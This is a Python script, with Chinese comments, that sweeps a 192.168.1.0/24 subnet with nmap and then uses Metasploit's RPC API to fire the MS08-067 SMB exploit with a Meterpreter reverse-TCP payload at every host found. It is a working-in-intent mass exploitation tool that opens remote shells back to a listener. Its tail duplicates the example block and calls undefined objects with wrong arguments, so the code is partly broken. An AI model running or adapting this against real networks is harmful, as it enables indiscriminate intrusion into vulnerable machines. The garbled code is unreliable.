import nmap
import requests
import msgpack
import time

class MetasploitAPI:
    def __init__(self, host, port, username, password):
        self.host = host
        self.port = port
        self.url = f"http://{host}:{port}/api/"
        self.username = username
        self.password = password
        self.token = None
        self.headers = {'Content-Type': 'binary/message-pack'}

    def login(self):
        data = {
            'method': 'auth.login',
            'username': self.username,
            'password': self.password
        }
        response = self._send_request(data)
        self.token = response.get('token')
        return self.token

    def _send_request(self, data):
        if self.token:
            data['token'] = self.token
        response = requests.post(self.url, headers=self.headers, data=msgpack.packb(data))
        return msgpack.unpackb(response.content)

    def create_console(self):
        data = {'method': 'console.create'}
        return self._send_request(data)

    def read_console(self, console_id):
        data = {'method': 'console.read', 'id': console_id}
        return self._send_request(data)

    def write_console(self, console_id, command):
        data = {'method': 'console.write', 'id': console_id, 'data': command}
        return self._send_request(data)

    def execute_module(self, module_type, module_name, options):
        data = {
            'method': 'module.execute',
            'module_type': module_type,
            'module_name': module_name,
            'options': options
        }
        return self._send_request(data)

    def list_sessions(self):
        data = {'method': 'session.list'}
        return self._send_request(data)

def scan_with_nmap(targets):
    nm = nmap.PortScanner()
    scan_arguments = '-sS -sV -O -p-'
    print(f"Scanning {targets} with arguments: {scan_arguments}")
    nm.scan(hosts=targets, arguments=scan_arguments)

    results = {}
    for host in nm.all_hosts():
        results[host] = {
            'hostname': nm[host].hostname(),
            'state': nm[host].state(),
            'osclass': nm[host].get('osclass', []),
            'ports': []
        }
        for proto in nm[host].all_protocols():
            ports = nm[host][proto].keys()
            for port in sorted(ports):
                port_info = nm[host][proto][port]
                results[host]['ports'].append({
                    'port': port,
                    'state': port_info['state'],
                    'service': port_info.get('product', ''),
                    'version': port_info.get('version', ''),
                    'cpe': port_info.get('cpe', '')
                })
    return results

def exploit_with_metasploit(api, target, lhost, lport):
    api.login()
    console = api.create_console()
    console_id = console['id']
    
    exploit = 'exploit/windows/smb/ms08_067_netapi'
    payload = 'windows/meterpreter/reverse_tcp'
    options = {'RHOSTS': target, 'LHOST': lhost, 'LPORT': lport}

    command = f'use {exploit}\n'
    api.write_console(console_id, command)
    for option, value in options.items():
        command = f'set {option} {value}\n'
        api.write_console(console_id, command)
    command = f'set PAYLOAD {payload}\n'
    api.write_console(console_id, command)
    command = 'exploit -j\n'
    api.write_console(console_id, command)
    
    time.sleep(10)  # 等待利用模块执行
    result = api.read_console(console_id)
    print(result['data'])

    sessions = api.list_sessions()
    print('Sessions:', sessions)

# 示例使用
targets = '192.168.1.0/24'
lhost = '192.168.1.101'
lport = 4444

# Nmap 扫描
nmap_results = scan_with_nmap(targets)
print("Nmap Scan Results:", nmap_results)

# Metasploit 利用
msf_api = MetasploitAPI(host='127.0.0.1', port=55553, username='msf', password='your_password')
for target in nmap_results:
    exploit_with_metasploit(msf_api, target, lhost, lport)

    
    msf.call('console.destroy', [console_id])

# 示例使用
targets = '192.168.1.0/24'
lhost = '192.168.1.101'
lport = 4444

# Nmap 扫描
nmap_results = scan_with_nmap(targets)
print("Nmap Scan Results:", nmap_results)

# Metasploit 利用
for target in nmap_results:
    exploit_with_metasploit(target, lhost, lport)
